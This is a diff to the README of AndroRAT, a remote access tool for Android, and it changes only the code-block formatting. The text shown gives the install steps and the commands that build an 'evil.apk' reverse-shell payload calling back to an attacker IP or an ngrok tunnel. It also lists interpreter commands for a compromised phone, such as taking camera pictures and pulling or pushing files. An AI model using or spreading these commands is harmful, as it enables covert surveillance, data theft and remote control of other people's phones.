@@ -29,7 +29,7 @@ AndroRAT is a tool designed to give the control of the android system remotely a
 AndroRAT requires Python (> 3.6) and JAVA 8 (or Android Studio)
 
 ## Installation
-```bash
+```
 git clone https://github.com/karma9874/AndroRAT.git
 pip install colorama
 ```
@@ -54,7 +54,7 @@ You must run Git bash with administrator privileges.
 
 ### `build` mode
 
-```bash
+```
 Usage:
   python androRAT.py --build --ngrok [flags]
   Flags:
@@ -62,7 +62,7 @@ Usage:
     -o, --output            Name for the apk file (optional by default its set to "karma.apk")
 ```
 
-```bash
+```
 Usage:
   python androRAT.py --build [flags]
   Flags:
@@ -73,7 +73,7 @@ Usage:
 
 Or you can manually build the apk by importing [Android Code](Android_Code) folder to Android Studio and changing the IP address and port number in [config.java](Android_Code/app/src/main/java/com/example/reverseshell2/config.java) file and then you can generate the signed apk from `Android Studio -> Build -> Generate Signed APK(s)`
 ### `shell` mode
-```bash
+```
 Usage:
   python androRAT.py --shell [flags]
   Flags:
@@ -83,7 +83,7 @@ Usage:
 After running the `shell` mode you will get an interpreter of the device  
 
 Commands which can run on the interpreter
-```bash
+```
     deviceInfo                 --> returns basic info of the device
     camList                    --> returns cameraID  
     takepic [cameraID]         --> Takes picture from camera
@@ -104,7 +104,7 @@ Commands which can run on the interpreter
     exit                       --> exit the interpreter
 ```
 In the sh shell there are some sub commands
-```bash
+```
     get [full_file_path]        --> donwloads the file to the local machine (file size upto 15mb)
     put [filename]              --> uploads the file to the android device
 ```
@@ -112,16 +112,13 @@ In the sh shell there are some sub commands
 ## Examples
 
 * To build the apk using ngrok which will also set the listner:
-```python androRAT.py --build --ngrok -o evil.apk
-```
+```python androRAT.py --build --ngrok -o evil.apk```
 
 * To build the apk using desired ip and port:
-```python androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk
-```
+```python androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
 
 * To get the interpreter:
-```python androRAT.py --shell -i 0.0.0.0 -p 8000
-```
+```python androRAT.py --shell -i 0.0.0.0 -p 8000```
 
 ## Interpreter Examples
 * Generating APK
